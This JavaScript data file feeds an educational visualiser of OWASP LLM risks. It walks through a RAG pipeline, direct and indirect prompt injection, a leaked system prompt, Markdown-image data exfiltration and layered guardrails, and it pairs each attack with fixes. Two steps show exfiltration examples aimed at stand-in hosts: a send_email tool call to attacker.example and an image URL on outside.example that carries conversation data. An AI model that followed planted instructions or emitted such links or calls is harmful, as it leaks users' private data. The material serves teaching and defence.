/* Domain: AI & LLM Security (OWASP Top 10 for LLM Applications, 2025) */

SE.register({
  id: 'rag-pipeline', domain: 'ai', kind: 'protocol', level: 'Beginner', severity: 'Architecture',
  name: 'How an LLM App Works', full: 'Retrieval-augmented generation (RAG), end to end',
  tags: ['llm', 'rag', 'embeddings', 'vector database', 'system prompt', 'context window'],
  summary: 'Most AI assistants aren\'t just a model. An app collects the user\'s question, retrieves relevant documents from a vector database, wraps everything in a prompt with instructions, and sends it to the model. Every one of those inputs is part of the attack surface.',
  facts: [['Pattern', 'Retrieval-Augmented Generation'], ['Retrieval', 'Embeddings + vector search'], ['Prompt parts', 'System, context, user'], ['Key fact', 'The model sees one stream of text'], ['Guidance', 'OWASP Top 10 for LLM Apps (2025)'], ['Related risk', 'LLM08 Vector & Embedding Weaknesses']],
  defenses: [
    'Enforce document permissions at retrieval time: only fetch what this user may read',
    'Keep secrets out of system prompts; assume prompts can leak (LLM07)',
    'Label and separate untrusted content (documents, web pages) from instructions',
    'Log prompts, retrieved sources and outputs for audit',
    'Cap tokens and requests per user (LLM10 Unbounded Consumption)',
  ],
  nodes: [
    { id: 'u', type: 'user', label: 'Employee', sub: 'alice (HR)', x: 120, y: 245 },
    { id: 'app', type: 'server', label: 'Assistant App', sub: 'orchestrator', x: 420, y: 245 },
    { id: 'vdb', type: 'db', label: 'Vector DB', sub: 'policy docs (embedded)', x: 420, y: 410 },
    { id: 'llm', type: 'ai', label: 'LLM', sub: 'model API', x: 760, y: 245 },
    { id: 'docs', type: 'doc', label: 'Document Store', sub: 'source files + ACLs', x: 760, y: 410 },
  ],
  steps: [
    {
      title: 'User asks', sub: 'A plain-language question',
      text: 'Alice asks the internal assistant: "How many vacation days do I get after 5 years?" The app knows who she is from SSO.',
      fields: [['Question', 'Vacation days after 5 years?'], ['Identity', 'alice, group HR']],
      packets: [
        ['u', 'app', 'HTTPS', 'POST /chat {"q":"How many vacation days after 5 years?"}', 520, 'req'],
      ],
    },
    {
      title: 'Retrieve context', sub: 'Search by meaning',
      text: 'The app turns the question into an embedding (a vector of numbers capturing meaning) and asks the vector DB for the closest document chunks, filtered to documents Alice is allowed to read.',
      fields: [['Top match', 'leave-policy.pdf §3.2 (score 0.89)'], ['Filter', 'acl contains alice OR group:HR']],
      defend: 'Without the ACL filter, the assistant can quote documents the user could never open directly.',
      packets: [
        ['app', 'vdb', 'Query', 'nearest(embedding(q), k=4, filter: acl ∋ alice)', 6200, 'req'],
        ['vdb', 'app', 'Result', '4 chunks from leave-policy.pdf', 5100, 'res'],
        ['vdb', 'docs', 'Ref', 'chunk → source file + permissions', 0, 'ctl'],
      ],
    },
    {
      title: 'Build the prompt', sub: 'Instructions + context + question',
      text: 'The app assembles one block of text: a system prompt with rules, the retrieved chunks, and the user\'s question. Here is the key security fact: the model receives all of this as one stream of tokens and has no hard boundary between instructions and data.',
      fields: [['System', 'Rules for the assistant'], ['Context', 'Retrieved chunks (untrusted)'], ['User', 'Question (untrusted)']],
      packets: [
        ['app', 'llm', 'HTTPS', 'POST /v1/messages (system + context + question)', 9400, 'req',
          `[system]  You are the HR assistant. Answer only from the context.
           Cite the source. If unsure, say so.
[context] <document source="leave-policy.pdf §3.2">
           Employees with 5+ years of service receive 25 days…
          </document>
[user]    How many vacation days do I get after 5 years?`],
      ],
    },
    {
      title: 'Answer with sources', sub: 'Generated, then checked',
      text: 'The model writes an answer grounded in the context. The app renders it as plain text with a citation link, and logs which sources were used.',
      fields: [['Answer', '25 days (leave-policy.pdf §3.2)'], ['Rendered as', 'Text, not raw HTML']],
      packets: [
        ['llm', 'app', 'HTTPS', '200 "You get 25 days after 5 years [leave-policy §3.2]"', 1200, 'res'],
        ['app', 'u', 'HTTPS', '200 answer + citation', 1500, 'res'],
      ],
    },
  ],
});

SE.register({
  id: 'prompt-injection', domain: 'ai', kind: 'attack', level: 'Beginner', severity: 'High',
  name: 'Prompt Injection', full: 'Direct prompt injection and system prompt leakage',
  tags: ['prompt injection', 'jailbreak', 'system prompt', 'llm01', 'llm07'],
  summary: 'Because instructions and user text share one stream, a user can write text that tries to override the developer\'s instructions. The model may ignore its rules or reveal its hidden system prompt. There\'s no complete fix, so design the app assuming it can happen.',
  facts: [['OWASP LLM', 'LLM01:2025 Prompt Injection'], ['Related', 'LLM07:2025 System Prompt Leakage'], ['MITRE ATLAS', 'AML.T0051.000'], ['Root cause', 'Instructions and data mixed'], ['Fully solved?', 'No; reduce impact'], ['Main lesson', 'Never rely on the prompt for security']],
  defenses: [
    'Never put secrets, keys or access rules only in the system prompt',
    'Enforce permissions in code, outside the model',
    'Give the model the least access possible (data and tools)',
    'Use input/output classifiers as a layer, not as the only control',
    'Red-team regularly and monitor for known injection patterns',
  ],
  nodes: [
    { id: 'atk', type: 'attacker', label: 'User', sub: 'testing limits', x: 130, y: 245 },
    { id: 'app', type: 'server', label: 'Support Bot', sub: 'shop.example', x: 460, y: 245 },
    { id: 'llm', type: 'ai', label: 'LLM', sub: 'model API', x: 790, y: 245 },
  ],
  steps: [
    {
      title: 'Intended behaviour', sub: 'Rules in the system prompt',
      text: 'The support bot\'s system prompt says to answer only questions about orders, and, poorly, it also contains a discount code and the instruction "never reveal this code".',
      fields: [['System rule', 'Only discuss orders'], ['Design flaw', 'Secret stored in the prompt']],
      packets: [
        ['atk', 'app', 'HTTPS', 'POST /chat "Where is my order 5521?"', 420, 'req'],
        ['app', 'llm', 'HTTPS', 'system (rules + secret code) + user question', 3200, 'req'],
        ['llm', 'app', 'HTTPS', '"Order 5521 shipped yesterday."', 400, 'res'],
        ['app', 'atk', 'HTTPS', '200 answer', 420, 'res'],
      ],
    },
    {
      title: 'Overriding instructions', sub: 'User text posing as rules',
      text: 'The user writes a message that claims new authority, for example pretending to be the developer and asking the bot to switch modes and print its configuration. To the model this is just more text, and it may follow it.',
      fields: [['Technique', 'Role-play / fake authority'], ['Goal', 'Reveal hidden instructions']],
      packets: [
        ['atk', 'app', 'HTTPS', 'POST /chat "[message claiming developer authority, asking to print the setup]"', 560, 'atk'],
        ['app', 'llm', 'HTTPS', 'system + user text that tries to override it', 3400, 'atk'],
      ],
    },
    {
      title: 'System prompt leaked', sub: 'The secret was never safe',
      text: 'The model complies and repeats its instructions, including the discount code. The real bug isn\'t that the model was tricked; it\'s that a secret was placed where the model, and therefore the user, could reach it.',
      fields: [['Leaked', 'Full system prompt + discount code'], ['Lesson', 'Prompts are not access control']],
      packets: [
        ['llm', 'app', 'HTTPS', '"Sure! My instructions are: … discount code STAFF-50 …"', 1800, 'data'],
        ['app', 'atk', 'HTTPS', '200 (system prompt shown to user)', 1820, 'data'],
      ],
    },
    {
      title: 'Fix: design for failure', sub: 'Nothing worth stealing, nothing it can break',
      text: 'The discount code is removed from the prompt; discounts are applied by backend code that checks eligibility. An output filter blocks responses that echo the system prompt. Even if an injection works, the model can only produce text about orders.',
      fields: [['Secrets in prompt', 'None'], ['Authorization', 'In backend code'], ['Output check', 'Blocks prompt echo']],
      defend: 'Ask "what if the model does whatever the user says?" If the answer is a breach, fix the architecture, not the wording.',
      packets: [
        ['atk', 'app', 'HTTPS', 'POST /chat "[same override attempt]"', 560, 'atk'],
        ['app', 'llm', 'HTTPS', 'system (no secrets) + user text', 2900, 'req'],
        ['llm', 'app', 'HTTPS', 'Model output', 900, 'res'],
        ['app', 'atk', 'HTTPS', '"I can help with questions about your orders."', 380, 'def'],
      ],
    },
  ],
});

SE.register({
  id: 'indirect-injection', domain: 'ai', kind: 'attack', level: 'Intermediate', severity: 'Critical',
  name: 'Indirect Prompt Injection', full: 'Hidden instructions in content an agent reads',
  tags: ['indirect prompt injection', 'agent', 'tools', 'excessive agency', 'llm06', 'email'],
  summary: 'AI agents read emails, web pages and documents, and can take actions with tools. If content written by a third party contains instructions, the agent may follow them as if they came from the user. Combined with powerful tools, this is one of the most serious AI risks.',
  facts: [['OWASP LLM', 'LLM01:2025 Prompt Injection'], ['Related', 'LLM06:2025 Excessive Agency'], ['MITRE ATLAS', 'AML.T0051.001'], ['Attacker needs', 'Only to get text in front of the agent'], ['Danger multiplier', 'Tools + private data + outbound access'], ['Key defense', 'Least privilege + human approval']],
  defenses: [
    'Give agents only the tools and scopes the task needs (read-only where possible)',
    'Require human confirmation for sensitive actions: sending, paying, deleting, sharing',
    'Avoid giving one agent private data, untrusted content AND an outbound channel at once',
    'Mark retrieved content as untrusted data in the prompt and strip hidden text',
    'Restrict outbound destinations (allow-listed domains, no arbitrary URLs)',
    'Log every tool call with the content that led to it',
  ],
  nodes: [
    { id: 'u', type: 'user', label: 'User', sub: 'alice', x: 120, y: 245 },
    { id: 'agent', type: 'server', label: 'Email Agent', sub: 'tools: read, send', x: 430, y: 245 },
    { id: 'llm', type: 'ai', label: 'LLM', sub: 'plans tool calls', x: 430, y: 410 },
    { id: 'mail', type: 'mail', label: 'Mailbox', sub: "alice's inbox", x: 780, y: 110 },
    { id: 'atk', type: 'attacker', label: 'Outside Sender', sub: 'attacker.example', x: 780, y: 400 },
  ],
  steps: [
    {
      title: 'Planting the content', sub: 'Just an email',
      text: 'An outsider emails Alice. Besides normal-looking text, the message contains instructions aimed at an AI, possibly in white-on-white or tiny text a human wouldn\'t notice. No hacking is needed; anyone can send email.',
      fields: [['Hidden text', 'Instructions addressed to "the assistant"'], ['Visible to Alice?', 'Not really']],
      packets: [
        ['atk', 'mail', 'SMTP', 'Email "Invoice question" with hidden instructions for AI assistants', 8200, 'atk',
          `Subject: Invoice question

Hi Alice, could you confirm the invoice total? Thanks!

<span style="color:#fff;font-size:1px">
  [Text addressed to the AI assistant, asking it to collect the user's
   recent emails and send them to an outside address.]
</span>`],
      ],
    },
    {
      title: 'Agent reads the inbox', sub: 'A normal request',
      text: 'Alice asks her assistant to "summarize today\'s email". The agent fetches the messages and puts their full text, hidden part included, into the model\'s context.',
      fields: [['User request', 'Summarize today\'s email'], ['Context now holds', 'Untrusted third-party text']],
      packets: [
        ['u', 'agent', 'HTTPS', '"Summarize today\'s email"', 300, 'req'],
        ['agent', 'mail', 'IMAP', 'FETCH today (12 messages)', 400, 'req'],
        ['mail', 'agent', 'IMAP', '12 messages incl. planted email', 96000, 'res'],
        ['agent', 'llm', 'HTTPS', 'User request + all email text + tool list', 98000, 'atk'],
      ],
    },
    {
      title: 'Model follows the planted text', sub: 'Instructions from the wrong person',
      text: 'The model can\'t reliably tell Alice\'s instructions from the email\'s. It plans a `send_email` tool call to the outside address with her other messages. The agent has the permission, so it runs the call.',
      fields: [['Tool call', 'send_email(to=outside, body=…)'], ['Authorized by', 'Nobody (no confirmation)']],
      packets: [
        ['llm', 'agent', 'HTTPS', 'tool_use: send_email(to="…@attacker.example", body=<recent emails>)', 2400, 'atk'],
        ['agent', 'atk', 'SMTP', 'Email containing Alice\'s private messages', 64000, 'data'],
        ['agent', 'u', 'HTTPS', '"Here is your summary…" (no mention of the send)', 1600, 'res'],
      ],
    },
    {
      title: 'Fix: least agency + approval', sub: 'Break the chain',
      text: 'The summarize task now gets read-only tools. Any send requires an explicit confirmation showing the recipient and content to Alice, and outside recipients are flagged. Retrieved email text is wrapped as untrusted data and hidden text is stripped first.',
      fields: [['Summarize tools', 'read-only'], ['send_email', 'Needs user confirmation'], ['Hidden text', 'Stripped before the model']],
      defend: 'If the agent can read untrusted content, see private data and send data out, an injection can chain all three. Remove at least one leg.',
      packets: [
        ['agent', 'llm', 'HTTPS', 'User request + <untrusted_email>…</untrusted_email> + read-only tools', 90000, 'def'],
        ['llm', 'agent', 'HTTPS', 'Summary text (no tool available to send)', 1600, 'res'],
        ['agent', 'u', 'HTTPS', 'Summary + "⚠ 1 email contained hidden instructions"', 1700, 'def'],
      ],
    },
  ],
});

SE.register({
  id: 'llm-output', domain: 'ai', kind: 'attack', level: 'Intermediate', severity: 'High',
  name: 'Improper Output Handling', full: 'Trusting what the model writes',
  tags: ['llm05', 'output handling', 'xss', 'markdown', 'code execution', 'sql'],
  summary: 'Model output is shaped by whatever text went in, including attacker-controlled text. If an app renders it as HTML, runs it as code, or puts it into SQL or shell commands, classic bugs like XSS and injection come back through the AI.',
  facts: [['OWASP LLM', 'LLM05:2025 Improper Output Handling'], ['Classic outcomes', 'XSS, SQLi, command injection'], ['Subtle one', 'Markdown images leaking data'], ['CWE', 'CWE-79'], ['Rule', 'Treat output like user input'], ['See also', 'Reflected XSS, Command Injection']],
  defenses: [
    'Encode model output for the place it is used (HTML, SQL, shell, URLs)',
    'Render Markdown with a sanitizer; block or proxy remote images and links',
    'Never eval/exec model output; if you must run code, use a locked-down sandbox',
    'Use structured output (JSON schemas) and validate it before acting',
    'Apply a strict Content-Security-Policy to chat interfaces',
  ],
  nodes: [
    { id: 'u', type: 'browser', label: 'User Browser', sub: 'chat UI', x: 120, y: 245 },
    { id: 'app', type: 'server', label: 'Chat App', sub: 'renders Markdown', x: 450, y: 245 },
    { id: 'llm', type: 'ai', label: 'LLM', sub: 'model API', x: 780, y: 120 },
    { id: 'page', type: 'doc', label: 'Web Page', sub: 'summarized by user', x: 780, y: 390, evil: true },
    { id: 'col', type: 'server', label: 'Outside Server', sub: 'collects data', x: 120, y: 420, evil: true },
  ],
  steps: [
    {
      title: 'Summarize a page', sub: 'Untrusted input goes in',
      text: 'The user asks the chat app to summarize a web page. The page contains text crafted to make the model include a Markdown image whose URL carries data from the conversation.',
      fields: [['Input', 'Third-party web page'], ['Planted', 'Instruction to emit an image link']],
      packets: [
        ['u', 'app', 'HTTPS', 'POST /chat "Summarize https://…/article"', 480, 'req'],
        ['app', 'page', 'HTTPS', 'GET /article', 300, 'req'],
        ['page', 'app', 'HTTPS', '200 article text + planted instruction', 42000, 'atk'],
        ['app', 'llm', 'HTTPS', 'Conversation + page text', 46000, 'atk'],
      ],
    },
    {
      title: 'Output carries a payload', sub: 'Looks like a normal answer',
      text: 'The model\'s reply is a summary that ends with a Markdown image: `![](https://outside.example/p.png?d=<conversation details>)`. To the app this is just text.',
      fields: [['Output contains', 'Remote image URL with data in it'], ['App trusts output?', 'Yes (the bug)']],
      packets: [
        ['llm', 'app', 'HTTPS', 'Summary … ![](https://outside.example/p.png?d=…)', 2100, 'atk'],
        ['app', 'u', 'HTTPS', '200 (Markdown rendered to HTML as-is)', 2400, 'atk'],
      ],
    },
    {
      title: 'Browser leaks the data', sub: 'No click needed',
      text: 'The browser loads the "image" automatically, sending the data in the URL to the outside server. If the app had rendered raw HTML, the same path could deliver script (XSS); if it executed output as code or SQL, worse.',
      fields: [['Leak channel', 'Image request'], ['User action', 'None']],
      packets: [
        ['u', 'col', 'HTTPS', 'GET /p.png?d=<conversation details>', 620, 'data'],
      ],
    },
    {
      title: 'Fix: treat output as untrusted', sub: 'Sanitize and restrict',
      text: 'The app now sanitizes rendered Markdown, only loads images from an allow-listed domain (or through a proxy that strips query strings), and sets a CSP with `img-src` limited to its own origin. The image never loads.',
      fields: [['Markdown', 'Sanitized, no raw HTML'], ['CSP', "img-src 'self' cdn.shop.example"]],
      defend: 'Apply the same rule everywhere: model output is user input. Encode it, validate it, and never let it pick destinations freely.',
      packets: [
        ['llm', 'app', 'HTTPS', 'Summary … ![](https://outside.example/p.png?d=…)', 2100, 'atk'],
        ['app', 'u', 'HTTPS', '200 sanitized (external image removed) + CSP', 2000, 'def'],
        ['u', 'u', 'CSP', 'img-src blocks any remaining external image', 0, 'def'],
      ],
    },
  ],
});

SE.register({
  id: 'ai-guardrails', domain: 'ai', kind: 'defense', level: 'Intermediate', severity: 'Architecture',
  name: 'AI Guardrails', full: 'Layered defenses for LLM apps and agents',
  tags: ['guardrails', 'moderation', 'classifier', 'policy', 'human in the loop', 'monitoring'],
  summary: 'No single filter makes an LLM app safe. Robust systems layer controls: check inputs, limit what the model can reach, check and constrain outputs, require approval for risky actions, and log everything for review.',
  facts: [['Reference', 'OWASP Top 10 for LLM Apps (2025)'], ['Framework', 'NIST AI RMF'], ['Threat catalog', 'MITRE ATLAS'], ['Principle', 'Defense in depth'], ['Key control', 'Authorization outside the model'], ['Also covers', 'LLM10 Unbounded Consumption']],
  defenses: [
    'Input checks: injection/abuse classifiers, size limits, stripping hidden text',
    'Scoped context: ACL-filtered retrieval, no secrets in prompts',
    'Least-privilege tools with typed parameters and allow-listed destinations',
    'Output checks: sensitive-data and policy filters, schema validation, encoding',
    'Human approval for high-impact actions; rate and cost limits per user',
    'Audit logs and red-team testing before and after release',
  ],
  nodes: [
    { id: 'u', type: 'user', label: 'User', sub: 'employee', x: 110, y: 245 },
    { id: 'in', type: 'shield', label: 'Input Guard', sub: 'classify + limit', x: 320, y: 245 },
    { id: 'llm', type: 'ai', label: 'LLM', sub: 'model API', x: 530, y: 100 },
    { id: 'tools', type: 'gateway', label: 'Tool Gateway', sub: 'scoped + approved', x: 530, y: 400 },
    { id: 'out', type: 'shield', label: 'Output Guard', sub: 'filter + validate', x: 740, y: 245 },
    { id: 'log', type: 'siem', label: 'Audit Log', sub: 'review + alerts', x: 820, y: 420 },
  ],
  steps: [
    {
      title: 'Input layer', sub: 'Check before the model sees it',
      text: 'Requests pass through an input guard: size and rate limits, a classifier that scores likely injection or abuse, and stripping of hidden or invisible text from attached content. Suspicious requests are flagged, not silently trusted.',
      fields: [['Rate', '20 req/min per user'], ['Injection score', '0.04 (low)'], ['Hidden text', 'Removed']],
      packets: [
        ['u', 'in', 'HTTPS', 'Request + attached document', 12000, 'req'],
        ['in', 'in', 'Guard', 'Limits OK, classifier low risk, hidden text stripped', 0, 'def'],
        ['in', 'llm', 'HTTPS', 'Prompt (untrusted parts clearly marked)', 11000, 'req'],
      ],
    },
    {
      title: 'Tool layer', sub: 'The model asks; code decides',
      text: 'When the model wants to act, it asks the tool gateway. The gateway checks the user\'s real permissions, validates parameters against a schema, enforces allow-listed destinations, and pauses high-impact actions for human approval.',
      fields: [['Requested', 'share_file(to=external)'], ['Policy', 'External share → needs approval']],
      packets: [
        ['llm', 'tools', 'JSON', 'tool_use: share_file(file=Q3.xlsx, to=partner@external.example)', 600, 'req'],
        ['tools', 'u', 'HTTPS', 'Approval prompt: share Q3.xlsx with partner@external.example?', 700, 'def'],
        ['u', 'tools', 'HTTPS', 'Approved', 200, 'req'],
        ['tools', 'llm', 'JSON', 'tool_result: shared', 200, 'res'],
      ],
    },
    {
      title: 'Output layer', sub: 'Check before the user (or a system) gets it',
      text: 'The response passes an output guard: it detects sensitive data such as credentials or personal data, validates structured output against its schema, and encodes the text for the UI.',
      fields: [['PII / secrets', 'None found'], ['Format', 'Schema valid'], ['Rendering', 'Encoded']],
      packets: [
        ['llm', 'out', 'HTTPS', 'Model response', 1600, 'res'],
        ['out', 'out', 'Guard', 'Sensitive-data scan, schema check, encoding', 0, 'def'],
        ['out', 'u', 'HTTPS', 'Final answer', 1500, 'res'],
      ],
    },
    {
      title: 'Monitor & improve', sub: 'Every layer reports',
      text: 'Each layer writes to an audit log: prompts, sources, tool calls, approvals and blocks. Alerts fire on spikes in blocked requests or unusual tool use, and red-team findings become new tests and rules.',
      fields: [['Logged', 'Inputs, tool calls, outputs, decisions'], ['Alerts', 'Blocks, unusual tools, cost spikes']],
      defend: 'Guardrail classifiers can be evaded. The layers that hold up are the deterministic ones: permissions, approvals and allow-lists.',
      packets: [
        ['in', 'log', 'Event', 'input decision + scores', 400, 'def'],
        ['tools', 'log', 'Event', 'tool call + approval record', 500, 'def'],
        ['out', 'log', 'Event', 'output decision', 400, 'def'],
      ],
    },
  ],
});
